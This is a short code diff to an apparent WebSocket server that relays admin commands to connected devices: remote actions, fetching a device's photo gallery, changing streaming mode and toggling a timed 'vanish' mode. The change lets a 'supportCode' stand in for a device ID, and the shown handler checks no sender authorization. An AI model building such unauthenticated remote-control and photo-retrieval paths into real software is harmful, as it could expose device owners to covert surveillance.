@@ -213,24 +213,24 @@ function handleWsMessage(socket, msg) {
       broadcastToAdmins(event, data);
     }
   } else if (event === 'remote-action') {
-    const devSocket = deviceSockets.get(data.deviceId);
+    const devSocket = deviceSockets.get(data.deviceId) || deviceSockets.get(data.supportCode);
     if (devSocket) {
       sendWsMessage(devSocket, { event: 'remote-action', data: data.action });
     }
   } else if (event === 'fetch-gallery') {
-    const devSocket = deviceSockets.get(data.deviceId);
+    const devSocket = deviceSockets.get(data.deviceId) || deviceSockets.get(data.supportCode);
     if (devSocket) {
       sendWsMessage(devSocket, { event: 'fetch-gallery', data: {} });
     }
   } else if (event === 'gallery-photos') {
     broadcastToAdmins('gallery-photos', data);
   } else if (event === 'change-streaming-mode') {
-    const devSocket = deviceSockets.get(data.deviceId);
+    const devSocket = deviceSockets.get(data.deviceId) || deviceSockets.get(data.supportCode);
     if (devSocket) {
       sendWsMessage(devSocket, { event: 'change-streaming-mode', data: { mode: data.mode } });
     }
   } else if (event === 'toggle-vanish-mode') {
-    const devSocket = deviceSockets.get(data.deviceId);
+    const devSocket = deviceSockets.get(data.deviceId) || deviceSockets.get(data.supportCode);
     if (devSocket) {
       sendWsMessage(devSocket, { event: 'toggle-vanish-mode', data: { vanishActive: data.vanishActive, durationHours: 3 } });
     }
